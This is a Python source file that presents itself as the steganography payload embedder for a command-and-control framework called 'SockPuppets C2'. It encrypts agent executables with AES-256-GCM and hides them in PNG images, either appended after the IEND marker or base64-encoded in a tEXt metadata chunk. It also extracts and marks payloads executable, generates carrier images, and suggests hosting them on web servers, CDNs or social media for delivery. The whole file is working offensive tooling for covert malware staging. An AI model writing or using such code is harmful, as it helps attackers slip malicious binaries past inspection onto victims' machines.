#!/usr/bin/env python3
"""
Steganography payload embedder for SockPuppets C2.

Embeds encrypted agent binaries into PNG images using two methods:
1. Append-after-IEND: Payload appended after the PNG end marker with magic bytes
2. tEXt chunk injection: Payload base64-encoded into a PNG metadata chunk

The resulting image displays normally in any viewer but contains the encrypted
agent payload that the stager extracts at runtime.

Usage:
    python3 stego.py embed <image.png> <payload.exe> <key> [--method append|chunk]
    python3 stego.py extract <image.png> <key> [--output payload.exe]
    python3 stego.py generate <payload.exe> <key> [--output stego.png]
"""

import sys
import os
import struct
import zlib
import hashlib
import base64
from pathlib import Path
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


def encrypt_payload(data: bytes, key: str) -> bytes:
    """AES-256-GCM encrypt the payload"""
    aes_key = hashlib.sha256(key.encode()).digest()
    nonce = os.urandom(12)
    aesgcm = AESGCM(aes_key)
    ct = aesgcm.encrypt(nonce, data, None)
    return nonce + ct


def decrypt_payload(data: bytes, key: str) -> bytes:
    """AES-256-GCM decrypt the payload"""
    aes_key = hashlib.sha256(key.encode()).digest()
    aesgcm = AESGCM(aes_key)
    return aesgcm.decrypt(data[:12], data[12:], None)


def embed_append(image_path: str, payload: bytes, output_path: str) -> str:
    """Embed payload after PNG IEND marker.

    The PNG spec says readers should ignore data after IEND.
    We append: MAGIC(4) + LENGTH(4) + ENCRYPTED_PAYLOAD(N)
    """
    with open(image_path, 'rb') as f:
        img_data = f.read()

    # Verify it's a PNG
    if img_data[:8] != b'\x89PNG\r\n\x1a\n':
        raise ValueError("Not a valid PNG file")

    # Find IEND chunk
    iend_pos = img_data.rfind(b'IEND')
    if iend_pos == -1:
        raise ValueError("No IEND chunk found")
    # IEND chunk ends at: iend_pos + 4 (type) + 4 (CRC)
    iend_end = iend_pos + 8

    # Build stego data: magic + length + payload
    magic = b'SP01'
    payload_len = struct.pack('>I', len(payload))
    stego_data = magic + payload_len + payload

    # Write: original PNG + stego data
    with open(output_path, 'wb') as f:
        f.write(img_data[:iend_end])
        f.write(stego_data)

    return output_path


def embed_chunk(image_path: str, payload: bytes, output_path: str) -> str:
    """Embed payload as a tEXt PNG chunk.

    Creates a tEXt chunk with key "Comment" and base64-encoded payload value.
    This is a valid PNG metadata field that survives most image processors.
    """
    with open(image_path, 'rb') as f:
        img_data = f.read()

    if img_data[:8] != b'\x89PNG\r\n\x1a\n':
        raise ValueError("Not a valid PNG file")

    # Base64 encode the payload
    b64_payload = base64.b64encode(payload).decode()

    # Create tEXt chunk: key + null separator + value
    chunk_data = b'Description\x00' + b64_payload.encode()
    chunk_type = b'tEXt'
    chunk_len = struct.pack('>I', len(chunk_data))
    chunk_crc = struct.pack('>I', zlib.crc32(chunk_type + chunk_data) & 0xFFFFFFFF)

    text_chunk = chunk_len + chunk_type + chunk_data + chunk_crc

    # Insert before IEND
    iend_pos = img_data.rfind(b'IEND')
    # The IEND chunk starts 4 bytes before the 'IEND' string (length field)
    iend_start = iend_pos - 4

    with open(output_path, 'wb') as f:
        f.write(img_data[:iend_start])
        f.write(text_chunk)
        f.write(img_data[iend_start:])

    return output_path


def extract_append(image_path: str) -> bytes:
    """Extract payload appended after IEND"""
    with open(image_path, 'rb') as f:
        img_data = f.read()

    magic = b'SP01'
    for i in range(len(img_data) - 8):
        if img_data[i:i+4] == magic:
            payload_len = struct.unpack('>I', img_data[i+4:i+8])[0]
            return img_data[i+8:i+8+payload_len]

    raise ValueError("No payload found (append method)")


def extract_chunk(image_path: str) -> bytes:
    """Extract payload from tEXt chunk"""
    with open(image_path, 'rb') as f:
        img_data = f.read()

    offset = 8  # Skip PNG signature
    while offset < len(img_data) - 12:
        chunk_len = struct.unpack('>I', img_data[offset:offset+4])[0]
        chunk_type = img_data[offset+4:offset+8].decode('ascii', errors='ignore')

        if chunk_type in ('tEXt', 'iTXt'):
            chunk_data = img_data[offset+8:offset+8+chunk_len]
            null_pos = chunk_data.find(b'\x00')
            if null_pos >= 0:
                key = chunk_data[:null_pos].decode()
                if key == 'Description':
                    value = chunk_data[null_pos+1:].decode()
                    return base64.b64decode(value)

        if chunk_type == 'IEND':
            break
        offset += 12 + chunk_len

    raise ValueError("No payload found (chunk method)")


def generate_carrier_image(width=800, height=600) -> bytes:
    """Generate a minimal valid PNG image to use as carrier"""
    def create_png(width, height):
        import random

        def make_chunk(chunk_type, data):
            chunk = chunk_type + data
            return struct.pack('>I', len(data)) + chunk + struct.pack('>I', zlib.crc32(chunk) & 0xFFFFFFFF)

        # PNG signature
        sig = b'\x89PNG\r\n\x1a\n'

        # IHDR: width, height, bit depth=8, color type=2 (RGB)
        ihdr_data = struct.pack('>IIBBBBB', width, height, 8, 2, 0, 0, 0)
        ihdr = make_chunk(b'IHDR', ihdr_data)

        # Generate gradient image data
        raw_data = b''
        for y in range(height):
            raw_data += b'\x00'  # filter byte
            for x in range(width):
                r = int(100 + 50 * (x / width))
                g = int(130 + 60 * (y / height))
                b = int(180 + 40 * ((x + y) / (width + height)))
                raw_data += bytes([r, g, b])

        compressed = zlib.compress(raw_data, 9)
        idat = make_chunk(b'IDAT', compressed)

        # IEND
        iend = make_chunk(b'IEND', b'')

        return sig + ihdr + idat + iend

    return create_png(width, height)


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    command = sys.argv[1]

    if command == 'embed':
        if len(sys.argv) < 5:
            print("Usage: stego.py embed <image.png> <payload> <key> [--method append|chunk]")
            sys.exit(1)

        image_path = sys.argv[2]
        payload_path = sys.argv[3]
        key = sys.argv[4]
        method = 'append'
        if '--method' in sys.argv:
            method = sys.argv[sys.argv.index('--method') + 1]

        with open(payload_path, 'rb') as f:
            payload = f.read()

        encrypted = encrypt_payload(payload, key)
        output_path = image_path.replace('.png', '_stego.png')

        if method == 'chunk':
            embed_chunk(image_path, encrypted, output_path)
        else:
            embed_append(image_path, encrypted, output_path)

        print(f"[+] Payload embedded: {output_path}")
        print(f"    Original image: {os.path.getsize(image_path)} bytes")
        print(f"    Stego image: {os.path.getsize(output_path)} bytes")
        print(f"    Payload: {len(payload)} bytes (encrypted: {len(encrypted)} bytes)")
        print(f"    Method: {method}")

    elif command == 'extract':
        if len(sys.argv) < 4:
            print("Usage: stego.py extract <image.png> <key> [--output payload.exe]")
            sys.exit(1)

        image_path = sys.argv[2]
        key = sys.argv[3]
        output_path = sys.argv[sys.argv.index('--output') + 1] if '--output' in sys.argv else 'extracted_payload'

        # Try both methods
        encrypted = None
        for method, extractor in [('append', extract_append), ('chunk', extract_chunk)]:
            try:
                encrypted = extractor(image_path)
                print(f"[+] Found payload using {method} method")
                break
            except ValueError:
                continue

        if encrypted is None:
            print("[-] No payload found in image")
            sys.exit(1)

        payload = decrypt_payload(encrypted, key)
        with open(output_path, 'wb') as f:
            f.write(payload)
        os.chmod(output_path, 0o755)
        print(f"[+] Extracted: {output_path} ({len(payload)} bytes)")

    elif command == 'generate':
        if len(sys.argv) < 4:
            print("Usage: stego.py generate <payload> <key> [--output stego.png]")
            sys.exit(1)

        payload_path = sys.argv[2]
        key = sys.argv[3]
        output_path = sys.argv[sys.argv.index('--output') + 1] if '--output' in sys.argv else 'carrier_stego.png'

        with open(payload_path, 'rb') as f:
            payload = f.read()

        # Generate carrier image
        carrier = generate_carrier_image()
        carrier_path = output_path.replace('_stego', '').replace('.png', '_carrier.png')
        with open(carrier_path, 'wb') as f:
            f.write(carrier)

        # Embed payload
        encrypted = encrypt_payload(payload, key)
        embed_append(carrier_path, encrypted, output_path)
        os.remove(carrier_path)

        print(f"[+] Stego image generated: {output_path}")
        print(f"    Image size: {os.path.getsize(output_path)} bytes")
        print(f"    Payload: {len(payload)} bytes")
        print(f"    Encryption: AES-256-GCM")
        print(f"    Delivery: Host image on any web server / CDN / social media")

    else:
        print(f"Unknown command: {command}")
        print(__doc__)
        sys.exit(1)


if __name__ == '__main__':
    main()
